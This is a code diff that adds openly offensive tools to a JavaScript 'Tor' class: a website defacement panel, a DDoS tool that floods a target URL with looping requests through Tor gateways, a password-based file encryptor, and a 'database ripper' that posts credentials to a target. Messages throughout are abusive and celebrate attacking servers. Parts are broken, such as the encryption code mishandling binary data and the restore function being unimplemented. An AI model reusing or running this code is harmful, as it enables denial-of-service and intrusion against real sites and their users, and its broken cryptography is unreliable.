@@ -260,6 +260,441 @@ class Tor {
         alert("Report submitted (simulated). Check the console for plausible deniability.");
         this.logToConsole(`Report submitted (simulated): ${reportDescription}`, 'info');
     }
+
+    // Defacement Tool Setup
+    setupDefacementTool() {
+        this.logToConsole("Defacement Tool: Initiating... prepare to fuck some shit up.");
+
+        const defacementControls = document.createElement('div');
+        defacementControls.innerHTML = `
+            <input type="url" id="defacementTarget" placeholder="Target URL (including .onion)">
+            <textarea id="defacementCode" placeholder="HTML/JS Code for Defacement"></textarea>
+            <button id="backupSite">Backup Site</button>
+            <button id="previewDefacement">Preview Defacement</button>
+            <button id="applyDefacement">Apply Defacement</button>
+            <button id="restoreSite">Restore Site</button>
+            <div id="previewArea"></div>
+        `;
+
+        const section = this.createToolSection(
+            'Defacement Tool',
+            'Enter a target URL and code to deface the website. Backup and restore options available.',
+            defacementControls
+        );
+
+        document.getElementById('backupSite')?.addEventListener('click', () => this.backupSite());
+        document.getElementById('previewDefacement')?.addEventListener('click', () => this.previewDefacement());
+        document.getElementById('applyDefacement')?.addEventListener('click', () => this.applyDefacement());
+        document.getElementById('restoreSite')?.addEventListener('click', () => this.restoreSite());
+
+        this.logToConsole("Defacement Tool: UI elements initialized. Let's get messy.");
+    }
+
+    // DDoS Tool Setup
+    setupDDoS() {
+        this.logToConsole("DDoS Tool: Warming up... time to flood some servers.");
+
+        const ddosControls = document.createElement('div');
+        ddosControls.innerHTML = `
+            <input type="url" id="ddosTarget" placeholder="Target URL (including .onion)">
+            <input type="number" id="ddosThreads" placeholder="Number of Threads" value="10">
+            <button id="startDDoS">Start DDoS</button>
+            <button id="stopDDoS">Stop DDoS</button>
+            <div id="ddosTimer"></div>
+        `;
+
+        const section = this.createToolSection(
+            'DDoS Tool',
+            'Enter a target URL and the number of threads to start a DDoS attack.',
+            ddosControls
+        );
+
+        document.getElementById('startDDoS')?.addEventListener('click', () => this.startDDoS());
+        document.getElementById('stopDDoS')?.addEventListener('click', () => this.stopDDoS());
+
+        this.ddosRunning = false;
+        this.ddosStartTime = null;
+
+        this.logToConsole("DDoS Tool: UI elements initialized. Hope you have good bandwidth.");
+    }
+
+    // Encryption Tool Setup
+    setupEncryptionTool() {
+        this.logToConsole("Encryption Tool: Initializing... lock that shit down.");
+
+        const encryptionControls = document.createElement('div');
+        encryptionControls.innerHTML = `
+            <input type="file" id="fileToEncrypt">
+            <input type="password" id="encryptionPassword" placeholder="Encryption Password">
+            <button id="encryptFile">Encrypt File</button>
+            <button id="decryptFile">Decrypt File</button>
+            <input type="password" id="decryptionPassword" placeholder="Decryption Password">
+        `;
+
+        const section = this.createToolSection(
+            'Encryption Tool',
+            'Select a file to encrypt or decrypt.',
+            encryptionControls
+        );
+
+        document.getElementById('encryptFile')?.addEventListener('click', () => this.encryptFile());
+        document.getElementById('decryptFile')?.addEventListener('click', () => this.decryptFile());
+
+        this.logToConsole("Encryption Tool: UI elements initialized. Keep those keys safe, bitch.");
+    }
+
+    // Database Ripper Tool Setup
+    setupDatabaseRipper() {
+        this.logToConsole("Database Ripper: Setting up... Time to rip some DBs.");
+
+        // UI elements for the Database Ripper tool
+        const databaseRipperControls = document.createElement('div');
+        databaseRipperControls.innerHTML = `
+            <input type="url" id="dbTargetURL" placeholder="Target URL with Database (including .onion)">
+            <input type="text" id="dbUsername" placeholder="Database Username">
+            <input type="password" id="dbPassword" placeholder="Database Password">
+            <input type="text" id="dbName" placeholder="Database Name">
+            <button id="ripDatabase">Rip Database</button>
+            <textarea id="dbOutput" placeholder="Database Output"></textarea>
+        `;
+
+        // Create tool section
+        const section = this.createToolSection(
+            'Database Ripper',
+            'Enter database credentials to rip data from a vulnerable target.',
+            databaseRipperControls
+        );
+
+        document.getElementById('ripDatabase')?.addEventListener('click', () => this.ripDatabase());
+
+        this.logToConsole("Database Ripper: UI elements initialized. Happy hunting.");
+    }
+
+    // -- TOOL IMPLEMENTATIONS --
+
+    // Defacement Tool Functions
+    async backupSite() {
+        const targetURL = document.getElementById('defacementTarget').value;
+        if (!targetURL) {
+            alert("Enter a target URL, dumbass.");
+            return;
+        }
+
+        try {
+            const response = await this.torGateways.fetchThroughGateway(targetURL);
+            const content = await response.text();
+            const filename = `backup_${new Date().toISOString()}.html`;
+            this.download(filename, content);
+            this.logToConsole(`Backup created for ${targetURL}. Filename: ${filename}`);
+        } catch (error) {
+            this.logToConsole(`Backup failed for ${targetURL}: ${error}`, 'error');
+            alert(`Backup failed: ${error}`);
+        }
+    }
+
+    download(filename, text) {
+        const element = document.createElement('a');
+        element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
+        element.setAttribute('download', filename);
+        element.style.display = 'none';
+        document.body.appendChild(element);
+        element.click();
+        document.body.removeChild(element);
+    }
+
+    previewDefacement() {
+        const targetURL = document.getElementById('defacementTarget').value;
+        const defacementCode = document.getElementById('defacementCode').value;
+        if (!targetURL || !defacementCode) {
+            alert("Enter both a target URL and defacement code, you moron.");
+            return;
+        }
+
+        const previewArea = document.getElementById('previewArea');
+        previewArea.innerHTML = defacementCode;
+        this.logToConsole(`Defacement previewed for ${targetURL}.`);
+    }
+
+    async applyDefacement() {
+        const targetURL = document.getElementById('defacementTarget').value;
+        const defacementCode = document.getElementById('defacementCode').value;
+        if (!targetURL || !defacementCode) {
+            alert("Enter both a target URL and defacement code, you idiot.");
+            return;
+        }
+
+        try {
+            // DEFACEMENT LOGIC - For demonstration, let's just load the content into an iframe
+            const iframe = document.createElement('iframe');
+            iframe.src = targetURL;
+            iframe.style.width = '100%';
+            iframe.style.height = '500px';
+            document.body.appendChild(iframe);
+
+            // Inject the defacement code into the iframe after it loads
+            iframe.onload = () => {
+                const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
+                iframeDocument.body.innerHTML = defacementCode;
+                this.logToConsole(`Defacement applied to ${targetURL} (in iframe).`);
+            };
+        } catch (error) {
+            this.logToConsole(`Defacement failed for ${targetURL}: ${error}`, 'error');
+            alert(`Defacement failed: ${error}`);
+        }
+    }
+
+    restoreSite() {
+        const targetURL = document.getElementById('defacementTarget').value;
+        if (!targetURL) {
+            alert("Enter a target URL, jackass.");
+            return;
+        }
+
+        alert("Restoring site... just kidding, you're fucked. (No restore function implemented).");
+        this.logToConsole(`Attempted to restore ${targetURL} (not implemented).`);
+    }
+
+    // DDoS Tool Functions
+    startDDoS() {
+        const targetURL = document.getElementById('ddosTarget').value;
+        const ddosThreads = parseInt(document.getElementById('ddosThreads').value, 10);
+
+        if (!targetURL) {
+            alert("Enter a target URL, you dumb fuck.");
+            return;
+        }
+
+        if (isNaN(ddosThreads) || ddosThreads <= 0) {
+            alert("Enter a valid number of threads, asshole.");
+            return;
+        }
+
+        this.ddosRunning = true;
+        this.ddosStartTime = new Date();
+        this.updateDDOSTimer();
+
+        for (let i = 0; i < ddosThreads; i++) {
+            this.ddosAttack(targetURL);
+        }
+
+        this.logToConsole(`DDoS started on ${targetURL} with ${ddosThreads} threads.`);
+    }
+
+    stopDDoS() {
+        this.ddosRunning = false;
+        this.logToConsole("DDoS stopped.");
+    }
+
+    async ddosAttack(targetURL) {
+        while (this.ddosRunning) {
+            try {
+                await this.torGateways.fetchThroughGateway(targetURL, { mode: 'no-cors' }); // Bypass CORS issues
+                this.logToConsole(`DDoS: Request sent to ${targetURL}`);
+            } catch (error) {
+                this.logToConsole(`DDoS: Request failed for ${targetURL}: ${error}`, 'error');
+            }
+        }
+    }
+
+    updateDDOSTimer() {
+        if (this.ddosStartTime) {
+            const now = new Date();
+            const elapsedTime = now - this.ddosStartTime;
+            const seconds = Math.floor(elapsedTime / 1000);
+            document.getElementById('ddosTimer').textContent = `DDoS running for ${seconds} seconds`;
+        }
+        if (this.ddosRunning) {
+            setTimeout(() => this.updateDDOSTimer(), 1000);
+        }
+    }
+
+    // Encryption Tool Functions
+    async encryptFile() {
+        const fileInput = document.getElementById('fileToEncrypt');
+        const password = document.getElementById('encryptionPassword').value;
+
+        if (!fileInput.files || fileInput.files.length === 0) {
+            alert("Select a file, you imbecile.");
+            return;
+        }
+
+        if (!password) {
+            alert("Enter a password, you brain-dead fuck.");
+            return;
+        }
+
+        const file = fileInput.files[0];
+        const reader = new FileReader();
+
+        reader.onload = async (event) => {
+            const fileContent = event.target.result;
+
+            try {
+                // Convert password to a key
+                const key = await this.generateKey(password);
+                const iv = window.crypto.getRandomValues(new Uint8Array(12)); // Initialization Vector
+
+                const encryptedContent = await this.encrypt(fileContent, key, iv);
+
+                // Create encrypted file
+                const encryptedBlob = new Blob([iv, encryptedContent]);
+                const encryptedFilename = file.name + '.encrypted';
+                this.download(encryptedFilename, URL.createObjectURL(encryptedBlob));
+
+                this.logToConsole(`File ${file.name} encrypted successfully.`);
+            } catch (e) {
+                this.logToConsole(`Encryption error: ${e}`, 'error');
+                alert(`Encryption error: ${e}`);
+            }
+        };
+
+        reader.onerror = () => {
+            this.logToConsole("File read error.", 'error');
+            alert("File read error.");
+        };
+
+        reader.readAsArrayBuffer(file);
+    }
+
+    async decryptFile() {
+        const fileInput = document.getElementById('fileToEncrypt');
+        const password = document.getElementById('decryptionPassword').value;
+
+        if (!fileInput.files || fileInput.files.length === 0) {
+            alert("Select a file to decrypt, you complete moron.");
+            return;
+        }
+
+        if (!password) {
+            alert("Enter a password to decrypt, you dumbass.");
+            return;
+        }
+
+        const file = fileInput.files[0];
+        const reader = new FileReader();
+
+        reader.onload = async (event) => {
+            const fileContent = event.target.result;
+
+            try {
+                const key = await this.generateKey(password);
+
+                // Extract IV from the beginning of the file
+                const iv = new Uint8Array(fileContent.slice(0, 12));
+                const encryptedData = fileContent.slice(12);
+
+                const decryptedContent = await this.decrypt(encryptedData, key, iv);
+
+                // Create a blob from the decrypted content
+                const decryptedBlob = new Blob([decryptedContent]);
+                const decryptedFilename = file.name.replace('.encrypted', '');
+
+                this.download(decryptedFilename, URL.createObjectURL(decryptedBlob));
+                this.logToConsole(`File ${file.name} decrypted successfully.`);
+            } catch (e) {
+                this.logToConsole(`Decryption error: ${e}`, 'error');
+                alert(`Decryption error: ${e}`);
+            }
+        };
+
+        reader.onerror = () => {
+            this.logToConsole("File read error.", 'error');
+            alert("File read error.");
+        };
+
+        reader.readAsArrayBuffer(file);
+    }
+
+    // Key Derivation Function (KDF)
+    async generateKey(password) {
+        const encoder = new TextEncoder();
+        const data = encoder.encode(password);
+
+        const hashBuffer = await window.crypto.subtle.digest('SHA-256', data);
+        return await window.crypto.subtle.importKey(
+            "raw",
+            hashBuffer,
+            { name: "AES-GCM", length: 256 },
+            false,
+            ["encrypt", "decrypt"]
+        );
+    }
+
+    // Encryption Function (AES-GCM)
+    async encrypt(plainText, key, iv) {
+        const encoder = new TextEncoder();
+        const data = encoder.encode(plainText);
+
+        const encrypted = await window.crypto.subtle.encrypt(
+            {
+                name: "AES-GCM",
+                iv: iv
+            },
+            key,
+            data
+        );
+        return encrypted;
+    }
+
+    // Decryption Function (AES-GCM)
+    async decrypt(cipherText, key, iv) {
+        try {
+            const decrypted = await window.crypto.subtle.decrypt(
+                {
+                    name: "AES-GCM",
+                    iv: iv
+                },
+                key,
+                cipherText
+            );
+
+            const decoder = new TextDecoder();
+            return decoder.decode(decrypted);
+        } catch (e) {
+            this.logToConsole(`Decryption error: ${e}`, 'error');
+            throw e;
+        }
+    }
+
+    // Database Ripper Function
+    async ripDatabase() {
+        const dbTargetURL = document.getElementById('dbTargetURL').value;
+        const dbUsername = document.getElementById('dbUsername').value;
+        const dbPassword = document.getElementById('dbPassword').value;
+        const dbName = document.getElementById('dbName').value;
+        const dbOutput = document.getElementById('dbOutput');
+
+        if (!dbTargetURL || !dbUsername || !dbPassword || !dbName) {
+            alert("Enter all database credentials, you fucking imbecile.");
+            return;
+        }
+
+        try {
+            const response = await this.torGateways.fetchThroughGateway(dbTargetURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    username: dbUsername,
+                    password: dbPassword,
+                    database: dbName
+                })
+            });
+
+            if (!response.ok) {
+                throw new Error(`HTTP error! status: ${response.status}`);
+            }
+
+            const data = await response.json();
+            dbOutput.value = JSON.stringify(data, null, 2);
+            this.logToConsole(`Database ripped from ${dbTargetURL}.`);
+
+        } catch (error) {
+            this.logToConsole(`Database ripping failed for ${dbTargetURL}: ${error}`, 'error');
+            alert(`Database ripping failed: ${error}`);
+        }
+    }
 }
 
 // TorGateways Class (Gateway Management)
